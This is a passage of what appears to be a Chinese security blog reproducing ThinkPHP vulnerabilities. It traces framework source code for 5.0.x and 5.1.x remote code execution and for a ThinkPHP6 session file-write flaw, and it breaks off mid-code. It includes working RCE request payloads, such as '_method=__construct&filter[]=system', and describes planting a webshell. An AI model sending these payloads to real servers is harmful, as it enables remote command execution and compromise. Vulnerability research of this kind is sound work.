class="line"></span><br><span class="line">		...</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>于是有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/public/index.php?s=captcha</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="%5Bhttps://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%5D(https://www.smi1e.top/thinkphp-5-0-05-0-23-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)">Smi1e —- ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p>
<p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3845#toc-2">https://xz.aliyun.com/t/3845#toc-2</a> </p>
<p> <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce">https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/ThinkPHP%205.0.0~5.0.23%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cku8j3fgn002ddan75ckdhitx" data-title="ThinkPHP 5.0.0~5.0.23 RCE 漏洞复现" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p>
<p>测试环境 5.1.29</p>
<p><strong>入口处关闭报错</strong> </p>
<p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p>
<p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p>
<p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p>
<p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p>
<p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p>
<p>我们从<code>Request::param</code>处开始分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="keyword">$this</span>-&gt;post(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="keyword">$this</span>-&gt;put(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;post)) &#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;post = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>) ? <span class="variable">$_POST</span> : <span class="keyword">$this</span>-&gt;getInputData(<span class="keyword">$this</span>-&gt;input);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;post, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p>
<p>跟进<code>Request::input</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解析过滤器</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="keyword">$this</span>-&gt;getFilter(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">            reset(<span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filterValue(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为<code>$data</code>是数组(<code>$_POST</code>),调用<code>array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></p>
<p>对<code>$data</code>中所有值调用<code>Request::filterValue</code></p>
<p>跟进去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;<span class="variable">$value</span>, <span class="variable">$key</span>, <span class="variable">$filters</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$default</span> = array_pop(<span class="variable">$filters</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_callable(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">                <span class="variable">$value</span> = call_user_func(<span class="variable">$filter</span>, <span class="variable">$value</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (is_scalar(<span class="variable">$value</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">false</span> !== strpos(<span class="variable">$filter</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 正则过滤</span></span><br><span class="line">                    <span class="keyword">if</span> (!preg_match(<span class="variable">$filter</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 匹配不成功返回默认值</span></span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable">$filter</span>)) &#123;</span><br><span class="line">                    <span class="comment">// filter函数不存在时, 则使用filter_var进行过滤</span></span><br><span class="line">                    <span class="comment">// filter为非整形值时, 调用filter_id取得过滤id</span></span><br><span class="line">                    <span class="variable">$value</span> = filter_var(<span class="variable">$value</span>, is_int(<span class="variable">$filter</span>) ? <span class="variable">$filter</span> : filter_id(<span class="variable">$filter</span>));</span><br><span class="line">                    <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$value</span>) &#123;</span><br><span class="line">                        <span class="variable">$value</span> = <span class="variable">$default</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>阅读代码可知,filterValue会对<code>$_POST</code>中所有值调用<code>$filter</code>中每一个可以调用的函数或方法</p>
<p>且<code>$filter</code>=<code>$_POST</code></p>
<p>因此有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/public/</span><br><span class="line">POST:  var1=exec&amp;var2=calc.exe&amp;_method=filter</span><br></pre></td></tr></table></figure>



<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>对method进行了白名单限制</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://www.smi1e.top/thinkphp-5-1-x5-2-x%E5%85%A8%E7%89%88%E6%9C%AC-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cku8j3fgp002idan7dunz0hd7" data-title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP6 任意文件操作漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
<li>ThinkPHP6.0.0-6.0.1</li>
<li>开启Sessoin中间件</li>
</ol>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a target="_blank" rel="noopener" href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
<p>复现环境为:phpstudy+thinkphp6.0.1</p>
<p><code>\app\controller\index.php</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Session</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Session::set(<span class="string">&#x27;name&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . Session::get(<span class="string">&#x27;name&#x27;</span>);;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>\app\middleware.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 全局中间件定义文件</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// 全局请求缓存</span></span><br><span class="line">    <span class="comment">// \think\middleware\CheckRequestCache::class,</span></span><br><span class="line">    <span class="comment">// 多语言加载</span></span><br><span class="line">    <span class="comment">// \think\middleware\LoadLangPack::class,</span></span><br><span class="line"><span class="comment">//     Session初始化</span></span><br><span class="line">     \think\middleware\SessionInit::class</span><br><span class="line">];</span><br></pre></td></tr></table></figure>





<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;clearFlashData();<span class="comment">//清除原来的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$sessionId</span> = <span class="keyword">$this</span>-&gt;getId();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;write(<span class="variable">$sessionId</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler-&gt;delete(<span class="variable">$sessionId</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;init = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$sessID</span>, <span class="keyword">string</span> <span class="variable">$sessData</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;getFileName(<span class="variable">$sessID</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$data</span>     = <span class="variable">$sessData</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = gzcompress(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;writeFile(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再跟进<code>$this-&gt;writeFile</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$content</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">bool</span>) file_put_contents(<span class="variable">$path</span>, <span class="variable">$content</span>, LOCK_EX);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
<p>跟进去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileName</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">bool</span> <span class="variable">$auto</span> = <span class="literal">false</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;prefix&#x27;</span>]) &#123;</span><br><span class="line">           <span class="comment">// 使用子目录</span></span><br><span class="line">           <span class="variable">$name</span> = <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;prefix&#x27;</span>] . DIRECTORY_SEPARATOR . <span class="string">&#x27;sess_&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="variable">$name</span> = <span class="string">&#x27;sess_&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$filename</span> = <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span>;</span><br><span class="line">       <span class="variable">$dir</span>      = dirname(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !is_dir(<span class="variable">$dir</span>)) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               mkdir(<span class="variable">$dir</span>, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">               <span class="comment">// 创建失败</span></span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$filename</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getId</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setId</span>(<span class="params"><span class="variable">$id</span> = <span class="literal">null</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;id = is_string(<span class="variable">$id</span>) &amp;&amp; strlen(<span class="variable">$id</span>) === <span class="number">32</span> ? <span class="variable">$id</span> : md5(microtime(<span class="literal">true</span>) . session_create_id());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32 </code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
<p>查找调用setId的函数</p>
<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
<p>其中<code>SessionInit</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// Session初始化</span></span><br><span class="line">       <span class="variable">$varSessionId</span> = <span class="keyword">$this</span>-&gt;app-&gt;config-&gt;get(<span class="string">&#x27;session.var_session_id&#x27;</span>);</span><br><span class="line">       <span class="variable">$cookieName</span>   = <span class="keyword">$this</span>-&gt;session-&gt;getName();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$varSessionId</span> 